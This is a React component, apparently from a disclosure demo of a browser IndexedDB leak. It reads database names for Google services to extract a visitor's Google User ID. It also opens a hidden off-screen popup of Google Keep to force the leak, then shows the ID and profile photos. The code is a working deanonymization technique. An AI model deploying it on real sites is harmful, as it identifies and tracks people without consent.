import { useState, useEffect } from 'react'
import PropTypes from 'prop-types'

import Photos from './Photos'
import Tooltip from '../Tooltip'

const GOOGLE_ID_PATTERNS = [
  /offline.settings.(\d+)/, // calendar.google.com
  /offline.requests.(\d+)/,
  /Keep-(\d+)/, // keep.google.com
  /LogsDatabaseV2:(\d+)\|\|/, // youtube.com
  /PersistentEntityStoreDb:(\d+)\|\|/,
  /yt-idb-pref-storage:(\d+)\|\|/,
  /yt-it-response-store:(\d+)\|\|/,
  /yt-player-local-media:(\d+)\|\|/,
]

const GOOGLE_TOOLTIP_TEXT = `The Google User ID is an internal identifier generated by Google. It uniquely 
identifies a single Google account. It can be used with Google APIs to fetch public personal information of the 
account owner. The information exposed by these APIs is controlled by many factors. In general, at minimum the user's 
profile picture is typically available.`

export async function fetchGoogleIDs() {
  const popup = window.open('https://keep.google.com/u/0/', '', 'width=50,height=50,left=9999,top=9999')

  return new Promise(function (resolve) {
    const query = setInterval(async function () {
      const databases = await indexedDB.databases()
      const ids = new Set()

      databases.forEach((db) => {
        if (db.name.startsWith('Keep-')) {
          let id = db.name.split('-')[1]
          if (id.match(/\d+/)) ids.add(id)
        }
      })

      if (ids.size !== 0) {
        clearTimeout(checkPopup)
        resolve(cleanup(Array.from(ids)))
      }
    }, 80)

    const checkPopup = setTimeout(() => {
      resolve(cleanup([], query))
    }, 3000) // Wait 3 seconds to make sure the page is fully loaded on slower connections.
  })

  function cleanup(ids, query) {
    clearInterval(query)
    popup.close()

    return ids
  }
}

export default function Identifiers({ databases, initialGoogleIDs, isLoading }) {
  const [googleIDs, setGoogleIDs] = useState(new Set())
  const [loading, setLoading] = useState(false)
  const [forcedLeakFailed, setForcedLeakFailed] = useState(false)

  const updateGoogleIDs = (ids) => {
    const updated = new Set([...googleIDs, ...ids])

    if (!(updated.size === googleIDs.size && [...updated].every((value) => googleIDs.has(value)))) {
      setGoogleIDs(updated)
    }
  }

  const checkGoogleIDs = () => {
    const ids = new Set()

    for (const db of databases) {
      for (const p of GOOGLE_ID_PATTERNS) {
        const match = db.match(p)
        if (match) ids.add(match[1])
      }
    }

    return Array.from(ids)
  }

  useEffect(() => {
    setLoading(isLoading)
  }, [isLoading])

  useEffect(() => {
    // If initialGoogleIDs isn't null, we tried to force leaks but couldn't get any id.
    if (initialGoogleIDs) {
      initialGoogleIDs.length > 0 ? updateGoogleIDs(initialGoogleIDs) : setForcedLeakFailed(true)
    }
  }, [initialGoogleIDs])

  useEffect(() => {
    updateGoogleIDs(checkGoogleIDs(databases))
  }, [databases])

  const forceGoogleIDLeak = async (e) => {
    e.preventDefault()

    setLoading(true)
    setForcedLeakFailed(false)

    const ids = await fetchGoogleIDs()

    if (ids?.length > 0) {
      updateGoogleIDs(ids)
    } else {
      setForcedLeakFailed(true)
    }

    setLoading(false)
  }

  if (loading) {
    return <>Looking for Google User IDs...</>
  }

  if (forcedLeakFailed && googleIDs.size === 0) {
    return (
      <section>
        You are not logged in with any Google account.{' '}
        <a href="#" onClick={forceGoogleIDLeak}>
          Try again.
        </a>
      </section>
    )
  }

  return googleIDs?.size > 0 ? (
    <>
      <section>
        Your unique Google User ID{googleIDs.size > 1 ? 's' : ''}: <Tooltip content={GOOGLE_TOOLTIP_TEXT} />
        {Array.from(googleIDs).map((id) => {
          return <GoogleID key={id} googleid={id} />
        })}
      </section>
      <Photos ids={googleIDs} />
    </>
  ) : (
    <section>
      You can also test for Google User ID leaks.{' '}
      <a href="#" onClick={forceGoogleIDLeak}>
        Try it.
      </a>
    </section>
  )
}

Identifiers.propTypes = {
  databases: PropTypes.array,
  initialGoogleIDs: PropTypes.array,
  isLoading: PropTypes.bool,
}

function GoogleID(props) {
  return (
    <div>
      <strong>{props.googleid}</strong>
    </div>
  )
}

GoogleID.propTypes = {
  googleid: PropTypes.string,
}
